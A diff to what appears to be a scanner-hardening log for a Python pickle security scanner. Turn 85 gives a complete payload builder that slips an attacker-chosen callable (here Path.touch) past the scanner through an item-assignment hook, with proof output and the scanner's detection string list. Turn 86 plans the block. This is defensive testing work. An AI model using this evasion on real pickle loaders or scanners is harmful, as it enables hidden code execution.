@@ -4071,3 +4071,134 @@ Blocking plan:
 
 Performance note: one literal in the existing magic-method match arm, no
 membership-flow modeling.
+
+## Turn 85 - `__setitem__` item-assignment method gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as the class `__setitem__` method.
+- Instantiate the class with a marker path.
+- Call `operator.setitem(instance, 0o666, True)` during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_setitem_dunder_setitem_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__setitem__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "setitem"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x88",
+        b"\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=153`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=179`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=179`, `bytes_total=179`,
+  `opcode_count=35`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.setitem`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.setitem` call
+  returns a `DerivedPath` instance at
+  `/tmp/ma_operator_setitem_dunder_setitem_marker` and does not create the
+  marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_setitem_dunder_setitem_marker` and returns `None`
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with
+  `__setitem__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `operator.setitem(instance, 0o666, True)` dispatches to
+  `instance.__setitem__(0o666, True)`.
+- Because `__setitem__` points at `Path.touch`, CPython calls
+  `Path.touch(instance, mode=0o666, exist_ok=True)`. The file is created before
+  `pickle.loads()` returns, and the visible result is just `None`.
+
+Why the scanner missed it:
+
+- `__setitem__` is not in the suspicious magic-method string list. Current
+  coverage includes attribute hooks such as `__setattr__` and `__delattr__`,
+  but not item-protocol hooks.
+- `operator.setitem` is absent from `DANGEROUS_GLOBALS`; current `operator`
+  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as an item-assignment method, so the final
+  visible call target is a common mutator helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`,
+  `__getattribute__`, `__del__`, `__eq__`, or `__contains__`.
+
+Performance note: this is another precise magic-method seed gap. The focused
+next block should add `__setitem__` to the suspicious magic-method string
+list, with an oracle regression proving that class construction alone does not
+create the marker but `operator.setitem(instance, 0o666, True)` does. That
+keeps the hot path to one additional literal in the existing string policy and
+avoids item-protocol flow modeling.
+
+## Turn 86 - Block `__setitem__` item-assignment seeds
+
+Blocking plan:
+
+- Add `__setitem__` to the existing suspicious magic-method string list.
+  Item-assignment hooks can route execution through mutation dispatch rather
+  than an explicit dangerous call target.
+- Leave `operator.setitem`, `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed for this focused block. The static signal is
+  the attacker-controlled item-assignment slot name.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"__setitem__": Path.touch})` payload, verifies scan-time
+  detection on both the construction-only control and `operator.setitem` RCE
+  variants, proves the control instance does not create the marker, then
+  proves item mutation creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one literal in the existing magic-method match arm, no
+item-protocol flow modeling.
